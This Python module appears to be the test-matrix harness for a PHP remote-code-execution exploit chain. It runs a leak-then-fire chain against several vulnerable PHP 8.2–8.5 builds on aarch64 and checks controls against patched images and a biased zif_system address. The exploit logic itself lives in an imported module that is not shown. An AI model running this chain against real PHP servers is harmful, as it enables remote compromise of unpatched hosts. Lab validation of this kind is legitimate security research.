"""Version x arch matrix runner (G3) — the "general defaults" proof.

Each row is one default-install model and must pass the full triad:

  pos   leak -> fire -> allowlisted command output returned over HTTP
  neg   the same-version *patched* image blocks at the leak
  bias  `+0x1000` on zif_system prevents the fire (load-bearing address)

A row is "proven for that build" only when all three legs hold. This module
holds the row table and the verdict logic; `poc/verify_matrix.py` is the CLI.
Lab-only, fixed benign command allowlist.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path

from . import profiles, remote

ROOT = Path(__file__).resolve().parent.parent
BIAS = 0x1000

# Ports are the lab-matrix compose mapping (see lab-matrix/README.md).
ROWS = [
    {"key": "8.2", "version": "8.2.34", "patched": "8.2.35",
     "arch": "aarch64", "port": 18160, "patched_port": 18161, "workers": 1},
    {"key": "8.3", "version": "8.3.35", "patched": "8.3.36",
     "arch": "aarch64", "port": 18162, "patched_port": 18163, "workers": 1},
    # The 8.4 patch series: the same leak shape and geometry hold across the
    # mid/late series; 8.4.27 is the branch's fixed release, so it is the
    # negative for each. (8.4.1 leaks but yields no usable pointers — an
    # early-series shape difference; not included.)
    {"key": "8.4.10", "version": "8.4.10", "patched": "8.4.27",
     "arch": "aarch64", "port": 18126, "patched_port": 18165, "workers": 1},
    {"key": "8.4.20", "version": "8.4.20", "patched": "8.4.27",
     "arch": "aarch64", "port": 18127, "patched_port": 18165, "workers": 1},
    {"key": "8.4.23", "version": "8.4.23", "patched": "8.4.27",
     "arch": "aarch64", "port": 18123, "patched_port": 18165, "workers": 1},
    {"key": "8.4.24", "version": "8.4.24", "patched": "8.4.27",
     "arch": "aarch64", "port": 18124, "patched_port": 18165, "workers": 1},
    {"key": "8.4.25", "version": "8.4.25", "patched": "8.4.27",
     "arch": "aarch64", "port": 18125, "patched_port": 18165, "workers": 1},
    {"key": "8.4", "version": "8.4.26", "patched": "8.4.27",
     "arch": "aarch64", "port": 18164, "patched_port": 18165, "workers": 1},
    {"key": "8.5", "version": "8.5.11", "patched": "8.5.12",
     "arch": "aarch64", "port": 18166, "patched_port": 18167, "workers": 1},
]


@dataclass
class Leg:
    name: str
    ok: bool = False
    detail: str = ""
    output: str = ""
    skipped: bool = False


@dataclass
class RowResult:
    key: str
    version: str
    patched: str
    arch: str
    legs: list = field(default_factory=list)

    @property
    def proven(self):
        return (len(self.legs) == 3
                and all(leg.ok and not leg.skipped for leg in self.legs))

    def as_dict(self):
        return {
            "key": self.key, "version": self.version,
            "patched": self.patched, "arch": self.arch,
            "proven": self.proven,
            "legs": {leg.name: {"ok": leg.ok, "skipped": leg.skipped,
                                "detail": leg.detail, "output": leg.output}
                     for leg in self.legs},
        }


def _clear(path):
    try:
        if path and Path(path).exists():
            Path(path).unlink()
    except OSError:
        pass


def _chain(host, port, row, build, cmd, proof, bias=0, report=print):
    _clear(proof)
    res = remote.run_chain(
        host, port, workers=row["workers"], cmd=f"{cmd}>/out/p1",
        proof_host=str(proof), retries=3, arch=row["arch"],
        build=build, bias_zif=bias, report=report)
    return res


def run_row(row, cmd="id", proof=None, host="127.0.0.1", report=print):
    """Run the triad for one row."""
    proof = Path(proof or (ROOT / "lab-matrix" / "out" / "p1"))
    result = RowResult(row["key"], row["version"], row["patched"], row["arch"])

    report(f"== {row['version']} [{row['arch']}] — pos")
    pos = _chain(host, row["port"], row, row["version"], cmd, proof,
                 report=report)
    result.legs.append(Leg("pos", bool(pos.get("rce")),
                           "fire + output" if pos.get("rce")
                           else "no fire (leak shape not calibrated for this "
                                "build?)",
                           pos.get("output", "")))

    if not pos.get("rce"):
        # The controls are vacuous when the positive leg never leaked.
        for name in ("neg", "bias"):
            result.legs.append(Leg(name, False, "not evaluated (pos failed)",
                                   skipped=True))
        return result

    report(f"== {row['version']} [{row['arch']}] — neg ({row['patched']})")
    neg = _chain(host, row["patched_port"], row, None, cmd, proof,
                 report=report)
    result.legs.append(Leg("neg", not neg.get("rce"),
                           "patched blocked at leak" if not neg.get("rce")
                           else "patched target FIRED (control broken)"))

    report(f"== {row['version']} [{row['arch']}] — bias (+0x{BIAS:x})")
    bias = _chain(host, row["port"], row, row["version"], cmd, proof,
                  bias=BIAS, report=report)
    result.legs.append(Leg("bias", not bias.get("rce"),
                           "bias prevented fire" if not bias.get("rce")
                           else "biased address FIRED (address not load-bearing)"))
    return result


def markdown(results):
    lines = ["| build | arch | pos | neg | bias | proven |",
             "|---|---|---|---|---|---|"]
    for r in results:
        legs = {leg.name: ("skip" if leg.skipped
                           else "ok" if leg.ok else "FAIL")
                for leg in r.legs}
        lines.append(f"| {r.version} | {r.arch} | {legs.get('pos')} | "
                     f"{legs.get('neg')} | {legs.get('bias')} | "
                     f"{'✅' if r.proven else '❌'} |")
    return "\n".join(lines)


def validate_config(rows=None, arch=None):
    """Offline invariants for the matrix table (no network)."""
    rows = rows or ROWS
    if not rows:
        raise ValueError("matrix has no rows")
    keys = [r["key"] for r in rows]
    if len(keys) != len(set(keys)):
        raise ValueError("duplicate row keys")
    # Vuln ports must be distinct. A patched target may be shared by several
    # rows (the 8.4.x series all use the branch's 8.4.27 fix as the negative);
    # rows run sequentially, so one patched service is enough.
    ports = [r["port"] for r in rows]
    if len(ports) != len(set(ports)):
        raise ValueError("duplicate vuln ports in matrix")
    selected = [r for r in rows if not arch or r["arch"] == arch]
    if not selected:
        raise ValueError(f"no rows for arch {arch!r}")
    for r in selected:
        if r["patched"] == r["version"]:
            raise ValueError(f"{r['key']}: patched == version")
        if r["workers"] < 1:
            raise ValueError(f"{r['key']}: workers < 1")
        prof = profiles.find(php_version=r["version"], arch=r["arch"])
        if prof is None:
            raise ValueError(f"{r['key']}: no profile for {r['version']} "
                             f"{r['arch']}")
    return selected


def summary(results):
    return {
        "proven": sum(1 for r in results if r.proven),
        "total": len(results),
        "rows": [r.as_dict() for r in results],
    }


def dump(results):
    return json.dumps(summary(results), indent=2, sort_keys=True)
